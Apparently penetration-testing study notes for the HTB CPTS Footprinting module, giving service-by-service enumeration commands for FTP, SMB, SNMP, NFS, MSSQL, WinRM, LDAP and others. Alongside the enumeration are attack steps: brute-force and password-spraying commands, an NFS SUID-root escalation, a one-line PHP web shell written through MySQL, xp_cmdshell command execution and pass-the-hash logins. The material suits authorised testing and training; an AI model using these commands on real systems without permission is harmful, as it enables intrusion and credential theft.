# 03 — Footprinting Services

The HTB Footprinting module covers 21 services in depth. This is the deepest service enumeration module in the CPTS path — you need to know how to enumerate every common service you'll encounter on the exam network. For each service: what it is, what it reveals, how to enumerate it, and what to do with the findings.

---

## FTP (21/tcp)

```bash
# Banner grab
nc -vn TARGET 21

# Check for anonymous access
ftp TARGET
# Username: anonymous
# Password: (blank or any email)
ls -la
# Download everything
mget *
# Check for writable directories
put test.txt

# Nmap scripts
nmap --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor -p 21 TARGET

# Brute force
hydra -l admin -P rockyou.txt ftp://TARGET -t 4 -f
```

**What to look for:** Anonymous access, writable directories (upload a web shell if FTP root = web root), files with credentials, version for CVE search.

---

## SSH (22/tcp)

```bash
# Banner grab (reveals version and OS)
nc -vn TARGET 22
# SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6

# Check authentication methods
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 user@TARGET 2>&1
# Shows: publickey, password (what auth methods are accepted)

# Brute force
hydra -l root -P rockyou.txt ssh://TARGET -t 4 -f

# If you find an SSH key
chmod 600 id_rsa
ssh -i id_rsa user@TARGET
# If the key has a passphrase:
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
```

---

## SMB (445/tcp, 139/tcp)

```bash
# Enumerate shares, users, groups, password policy
enum4linux -a TARGET
# or
enum4linux-ng TARGET

# List shares
smbclient -L //TARGET -N                           # null session
smbclient -L //TARGET -U 'user%password'           # with creds
crackmapexec smb TARGET -u '' -p '' --shares       # null
crackmapexec smb TARGET -u 'user' -p 'pass' --shares

# Access a share
smbclient //TARGET/ShareName -N
smbclient //TARGET/ShareName -U 'user%password'

# Recursive file listing (see everything without connecting)
smbmap -H TARGET -u 'user' -p 'pass' -R

# Download all files from a share
smbget -R smb://TARGET/ShareName -U user%password

# Check for SMB vulnerabilities
nmap --script smb-vuln* -p 445 TARGET

# Enumerate users
crackmapexec smb TARGET -u '' -p '' --users
crackmapexec smb TARGET -u '' -p '' --rid-brute    # RID cycling

# Password spray
crackmapexec smb TARGET -u users.txt -p 'Password1!' --continue-on-success
```

**What to look for:** Readable shares (credentials in files), writable shares (plant payloads), user lists (for brute forcing/spraying), password policy (lockout threshold before spraying).

---

## SNMP (161/udp)

```bash
# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET

# Full SNMP walk
snmpwalk -v2c -c public TARGET

# Specific useful OIDs
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.1.5.0        # hostname
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2   # running processes
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed software
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.4.20.1.1     # IP addresses on interfaces
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3     # TCP connections

# Human-readable output
snmp-check TARGET -c public
```

**What to look for:** Running processes (reveals hidden services), IP addresses (reveals internal networks), installed software (versions for CVE search), sometimes plaintext credentials in process arguments.

---

## DNS (53/tcp/udp)

```bash
# Zone transfer (dumps all records)
dig axfr domain.com @TARGET
# If this works, you get EVERY hostname and IP

# Reverse lookups
dig -x TARGET_IP @DNS_SERVER

# Subdomain brute force
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs DEFAULT_SIZE

# Nmap scripts
nmap --script dns-zone-transfer -p 53 TARGET --script-args dns-zone-transfer.domain=domain.com
```

---

## NFS (2049/tcp)

```bash
# Show exports
showmount -e TARGET

# Mount a share
sudo mkdir /mnt/nfs
sudo mount -t nfs TARGET:/share /mnt/nfs

# Check for no_root_squash (privesc opportunity)
# If no_root_squash is set, root on your machine = root on the share
# Create a SUID binary:
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash
# On target: /share/rootbash -p → root shell

# Nmap scripts
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET
```

---

## SMTP (25/tcp)

```bash
# Banner grab
nc -vn TARGET 25

# Enumerate users with VRFY
smtp-user-enum -M VRFY -U users.txt -t TARGET

# Or manually
nc TARGET 25
VRFY admin
# 252 admin@target.com  → user exists
VRFY nonexistent
# 550 No such user      → user doesn't exist

# Nmap scripts
nmap --script smtp-enum-users,smtp-commands,smtp-open-relay -p 25 TARGET
```

**What to look for:** Valid usernames (for password attacks), open relay (can send spoofed emails), version for CVE search.

---

## MySQL (3306/tcp)

```bash
# Connect with found credentials
mysql -u root -p'password' -h TARGET

# Enumerate databases
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;

# Read files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

# Write files (if FILE privilege + writable path)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Nmap scripts
nmap --script mysql-info,mysql-enum,mysql-brute -p 3306 TARGET

# Brute force
hydra -l root -P rockyou.txt mysql://TARGET -t 4 -f
```

---

## MSSQL (1433/tcp)

```bash
# Connect with impacket
impacket-mssqlclient user:password@TARGET

# Enable xp_cmdshell (RCE through SQL)
SQL> EXEC sp_configure 'show advanced options', 1
SQL> RECONFIGURE
SQL> EXEC sp_configure 'xp_cmdshell', 1
SQL> RECONFIGURE
SQL> xp_cmdshell 'whoami'

# Enumerate databases
SQL> SELECT name FROM master.sys.databases

# Nmap scripts
nmap --script ms-sql-info,ms-sql-config,ms-sql-brute -p 1433 TARGET

# Brute force
hydra -l sa -P rockyou.txt mssql://TARGET -t 4 -f

# CrackMapExec
crackmapexec mssql TARGET -u user -p pass -x "whoami"
```

**MSSQL `xp_cmdshell` is a direct RCE vector.** If you get SA (sysadmin) credentials for MSSQL, you have code execution on the server.

---

## RDP (3389/tcp)

```bash
# Connect
xfreerdp /v:TARGET /u:user /p:'password' /cert-ignore
rdesktop TARGET -u user -p 'password'

# Brute force (slow — use small wordlists)
hydra -l admin -P top-100.txt rdp://TARGET -t 4 -f
crackmapexec rdp TARGET -u user -p pass

# Nmap scripts
nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 TARGET
# rdp-ntlm-info reveals: hostname, domain name, OS version
```

---

## WinRM (5985/tcp HTTP, 5986/tcp HTTPS)

```bash
# Connect with evil-winrm
evil-winrm -i TARGET -u user -p 'password'
evil-winrm -i TARGET -u user -H NTLM_HASH        # pass the hash

# CrackMapExec
crackmapexec winrm TARGET -u user -p pass
crackmapexec winrm TARGET -u user -p pass -x "whoami"

# Brute force
crackmapexec winrm TARGET -u users.txt -p passwords.txt
```

**WinRM is the preferred Windows remote access method for the CPTS.** If you have valid credentials and port 5985 is open, `evil-winrm` gives you a PowerShell session.

---

## LDAP (389/tcp, 636/tcp)

```bash
# Anonymous bind
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com"
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# With credentials
ldapsearch -x -H ldap://TARGET -D "user@domain.com" -w 'password' -b "DC=domain,DC=com"

# Dump everything
ldapsearch -x -H ldap://TARGET -D "user@domain.com" -w 'password' -b "DC=domain,DC=com" "(objectClass=*)"

# Nmap scripts
nmap --script ldap-search,ldap-rootdse -p 389 TARGET
```

**What to look for:** User accounts, group memberships, descriptions (often contain passwords), service accounts, computer objects, organizational structure.

---

## Service Enumeration Workflow

```
For EVERY open port on EVERY host:

1. IDENTIFY the service and version (nmap -sV)
2. SEARCH for exploits (searchsploit VERSION)
3. TRY default credentials
4. RUN service-specific scripts (nmap --script)
5. EXTRACT information (users, shares, files, configs)
6. TEST found credentials on OTHER services
7. DOCUMENT everything
```
